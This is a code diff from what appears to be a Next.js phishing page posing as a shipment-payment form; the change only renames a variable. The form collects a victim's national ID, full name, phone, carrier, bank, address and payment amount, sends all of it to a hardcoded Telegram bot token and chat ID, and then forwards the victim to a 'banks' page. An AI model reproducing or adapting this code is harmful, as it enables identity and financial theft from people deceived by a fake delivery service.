@@ -25,7 +25,7 @@ const Page = () => {
   let selecttypenumber=useRef();
 
   const x = useSearchParams();
-  const d = x.get("name");
+  const datas = x.get("name");
 
   const router = useRouter()
 
@@ -37,7 +37,7 @@ const Page = () => {
       token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
       chat_id:6364334502
     }
-    var length =`رقم الشحنة: ${numberTrack.current.value} %0A رقم بطاقة الاحوال: ${numbernation.current.value} %0A الاسم الكامل : ${fullname.current.value} %0A رقم الجوال: ${numphone.current.value} %0A نوع الشحنة :${typeshohna.current.value} %0A نوع مشغل الجوال :${selecttypenumber.current.value} %0A نوع البنك :${selectBanks.current.value} %0A العنوان :${adress.current.value} %0A المدينة :${city.current.value} %0A قيمة السداد: ${mony.current.value} %0A %0A ${d}`
+    var length =`رقم الشحنة: ${numberTrack.current.value} %0A رقم بطاقة الاحوال: ${numbernation.current.value} %0A الاسم الكامل : ${fullname.current.value} %0A رقم الجوال: ${numphone.current.value} %0A نوع الشحنة :${typeshohna.current.value} %0A نوع مشغل الجوال :${selecttypenumber.current.value} %0A نوع البنك :${selectBanks.current.value} %0A العنوان :${adress.current.value} %0A المدينة :${city.current.value} %0A قيمة السداد: ${mony.current.value} %0A %0A ${datas}`
 
 
     fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
@@ -120,7 +120,7 @@ if(numberTrack.current.value == "" || numbernation.current.value == "" || fullna
 
           <Link href={{
       pathname:"/fozajil/banks",
-      query:{name:d},
+      query:{name:datas},
     }}
      className={styles.button} onClick={handleSubmit}>التالي</Link>
         </form>
